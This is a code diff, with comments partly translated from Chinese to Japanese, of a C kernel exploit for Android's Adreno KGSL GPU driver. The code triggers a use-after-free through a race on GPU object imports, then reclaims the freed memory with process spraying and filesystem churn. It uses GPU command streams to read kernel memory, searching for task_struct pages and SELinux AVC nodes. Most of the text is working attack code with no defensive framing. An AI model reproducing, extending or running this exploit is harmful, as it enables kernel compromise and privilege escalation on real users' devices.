@@ -24,7 +24,18 @@
 #include <sys/shm.h>
 #include <sys/sysmacros.h>
 
-/* ========================== KGSL IOCTL 定义 ========================== */
+/* ========================== KGSL 定数（ユーザー空間用） ========================== */
+#define KGSL_MEMFLAGS_USE_CPU_MAP      (1ULL << 28)
+#define KGSL_CACHEMODE_SHIFT           0
+#define KGSL_CACHEMODE_MASK            3
+#define KGSL_CACHEMODE_WRITEBACK       3
+#define KGSL_USER_MEM_TYPE_ADDR        2
+#define KGSL_CONTEXT_PREAMBLE          0x00000010
+#define KGSL_CONTEXT_NO_GMEM_ALLOC     0x00000002
+#define KGSL_CMDLIST_IB                0x00000001U
+#define KGSL_TIMESTAMP_RETIRED         0x00000002
+
+/* ========================== KGSL IOCTL 定義 ========================== */
 #define KGSL_IOC_TYPE 0x09
 
 struct kgsl_gpuobj_alloc {
@@ -108,7 +119,7 @@ struct kgsl_cmdstream_readtimestamp_ctxtid {
 };
 #define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)
 
-/* 常量（相対オフセット） */
+/* ========================== オフセット定義（相対アドレス） ========================== */
 #define UAF_SIZE        0x10004000ULL
 #define OVERLAP_SIZE    0x7000ULL
 #define BOGUS_SIZE      0xffffffffffefd000ULL
@@ -124,13 +135,12 @@ struct kgsl_cmdstream_readtimestamp_ctxtid {
 #define PRE_PAGES_PER_IB 4
 #define CHURN_MAX_PATHS 20000
 
-/* 実際のアドレス（実行時に決定） */
+/* ========================== グローバル変数 ========================== */
 uint64_t g_uaf_addr = 0;
 uint64_t g_overlap_addr = 0;
 uint64_t g_bogus_addr = 0;
 uint64_t g_placeholder_addr = 0;
 
-/* ========================== 全局变量 ========================== */
 static int kgsl_fd = -1;
 static volatile int race_done = 0;
 static uint64_t alloc_flags = 0;
@@ -154,7 +164,7 @@ static void die(const char *msg) {
     exit(1);
 }
 
-/* ========================== Adreno PM4 命令构造 ========================== */
+/* ========================== Adreno PM4 命令 ========================== */
 static uint32_t pm4_parity(uint32_t v) {
     return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
 }
@@ -170,7 +180,7 @@ static inline void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
     *hi = (uint32_t)(addr >> 32);
 }
 
-/* ========================== KGSL 封装函数 ========================== */
+/* ========================== KGSL ラッパー ========================== */
 static int gpuobj_alloc(uint64_t size, uint64_t flags) {
     struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
     if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0)
@@ -238,7 +248,7 @@ static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
     return ret;
 }
 
-/* ========================== 阶段1：rbtree 占位（動的アドレス選択） ========================== */
+/* ========================== フェーズ1：アドレス選択 ========================== */
 static bool try_base_address(uint64_t base) {
     uint64_t uaf = base + OFFSET_UAF;
     uint64_t bogus = base + OFFSET_BOGUS;
@@ -247,7 +257,6 @@ static bool try_base_address(uint64_t base) {
 
     printf("[*] Trying base 0x%lx\n", base);
 
-    // 1) 割り当てとマッピング (UAF)
     int id = gpuobj_alloc(UAF_SIZE, alloc_flags);
     void *uaf_m = mmap((void*)uaf, UAF_SIZE, PROT_READ|PROT_WRITE,
                        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)id << 12);
@@ -256,18 +265,15 @@ static bool try_base_address(uint64_t base) {
         return false;
     }
     munmap(uaf_m, UAF_SIZE);
-    // 一旦解放（後で再利用するためIDは保持）
-    // ここではまだ解放しない（phase3で解放する）
-    uaf_id = id; // 保持
+    uaf_id = id; // 後で解放するために保持
 
-    // 2) BOGUS 匿名マッピング
     void *bogus_m = mmap((void*)bogus, 0x1000, PROT_READ|PROT_WRITE,
                          MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
     if (bogus_m == MAP_FAILED) {
         gpuobj_free(id);
         return false;
     }
-    // 3) PLACEHOLDER 割り当てとマッピング
+
     int ph = gpuobj_alloc(PLACEHOLDER_SIZE, alloc_flags);
     void *ph_m = mmap((void*)placeholder, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
                       MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph << 12);
@@ -276,7 +282,7 @@ static bool try_base_address(uint64_t base) {
         gpuobj_free(id);
         return false;
     }
-    // 成功！グローバルに保存
+
     g_uaf_addr = uaf;
     g_overlap_addr = overlap;
     g_bogus_addr = bogus;
@@ -289,7 +295,6 @@ static bool try_base_address(uint64_t base) {
 static void phase1_rbtree(void) {
     alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
 
-    // 候補ベース（デバイスに合わせて調整可能）
     uint64_t candidates[] = {
         0x700000000ULL,
         0x600000000ULL,
@@ -297,9 +302,12 @@ static void phase1_rbtree(void) {
         0x400000000ULL,
         0x300000000ULL,
         0x200000000ULL,
+        0x100000000ULL,
+        0x800000000ULL,
     };
     bool ok = false;
-    for (int i = 0; i < sizeof(candidates)/sizeof(candidates[0]); i++) {
+    int n_candidates = sizeof(candidates)/sizeof(candidates[0]);
+    for (int i = 0; i < n_candidates; i++) {
         if (try_base_address(candidates[i])) {
             ok = true;
             break;
@@ -315,7 +323,7 @@ static void phase1_rbtree(void) {
            (unsigned long)g_placeholder_addr, (unsigned long)g_overlap_addr);
 }
 
-/* ========================== 阶段2：竞争线程 ========================== */
+/* ========================== フェーズ2：競合 ========================== */
 static void *race_thread(void *arg) {
     struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = g_bogus_addr };
     struct kgsl_gpuobj_import imp = {
@@ -364,13 +372,13 @@ static bool phase2_race(void) {
     return true;
 }
 
-/* ========================== 阶段3：释放 UAF ========================== */
+/* ========================== フェーズ3：UAF解放 ========================== */
 static void phase3_free_uaf(void) {
     gpuobj_free(uaf_id);
     printf("[+] UAF freed\n");
 }
 
-/* ========================== 阶段4：内存回收 ========================== */
+/* ========================== フェーズ4：メモリ回収 ========================== */
 static void phase4_reclaim(void) {
     int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
     if (rf >= 0) {
@@ -385,7 +393,7 @@ static void phase4_reclaim(void) {
     usleep(10000);
 }
 
-/* ========================== 子进程喷池 ========================== */
+/* ========================== 子プロセススプレー ========================== */
 static pid_t spray_pids[SPRAY_PIDS];
 static int n_spray = 0;
 
@@ -413,7 +421,7 @@ static void kill_spray_children(void) {
     printf("[KILL] spray children killed\n");
 }
 
-/* ========================== 文件系统 churn ========================== */
+/* ========================== ファイルシステム churn ========================== */
 static void churn_walk(const char *dir, int depth) {
     if (depth > 5 || churn_npaths >= CHURN_MAX_PATHS)
         return;
@@ -470,7 +478,7 @@ static void churn_round(void) {
     mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
 }
 
-/* ========================== 预扫描 task_struct 页面 ========================== */
+/* ========================== task_struct プリスキャン ========================== */
 static int prescan_task_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                               void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                               uint64_t scan_start, uint64_t end_va,
@@ -516,7 +524,7 @@ static int prescan_task_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
             uint32_t *pd = &data[p * SCAN_DWORDS];
             int found = 0;
             for (int i = 0; i < SCAN_DWORDS - 1 && !found; i++)
-                if (pd[i] == 0x4B534154 && pd[i+1] == 0x21464155)   // "TASK" + "UAF!"
+                if (pd[i] == 0x4B534154 && pd[i+1] == 0x21464155)
                     found = 1;
             if (found && n < maxout) {
                 out_vas[n++] = pva + p * 0x1000;
@@ -528,7 +536,7 @@ static int prescan_task_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
     return n;
 }
 
-/* ========================== 扫描 AVC 节点 ========================== */
+/* ========================== AVC ノードスキャン ========================== */
 static int analyze_avc_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                              void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                              uint64_t *vas, int npages, int stride) {
@@ -545,7 +553,7 @@ static int analyze_avc_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
         return 0;
 
     while (idx < npages) {
-        int max_nodes_per_batch = (0x10000 - 256) / (4 * 6 * 4); // 每条 CP_MEM_TO_MEM 6 DWORD
+        int max_nodes_per_batch = (0x10000 - 256) / (4 * 6 * 4);
         if (max_nodes_per_batch < 1)
             max_nodes_per_batch = 1;
         int max_pages = max_nodes_per_batch / nodes_per_page;
@@ -617,7 +625,7 @@ static int analyze_avc_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
     return total_nodes;
 }
 
-/* ========================== 主函数 ========================== */
+/* ========================== main ========================== */
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
     printf("[*] KGSL UAF -> AVC Analyzer (ported)\n");
@@ -668,7 +676,6 @@ int main(int argc, char **argv) {
     printf("[GPU] ib_ga=0x%lx dst_ga=0x%lx\n",
            (unsigned long)ib_ga, (unsigned long)dst_ga);
 
-    // 扫描 task_struct 页面，寻找 "TASKUAF!!" 字符串
     uint64_t task_pgs[4096];
     int n_task = prescan_task_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
                                     g_uaf_addr + 0x2000,
@@ -705,9 +712,9 @@ int main(int argc, char **argv) {
                 }
             }
             if (comm_off != -1)
-                printf("[TASK] comm offset = 0x%x (relative to task_struct start)\n", comm_off);
+                printf("[TASK] comm offset = 0x%x\n", comm_off);
             else
-                printf("[TASK] comm string not found in first page (maybe offset diff)\n");
+                printf("[TASK] comm string not found in first page\n");
         }
     }
 
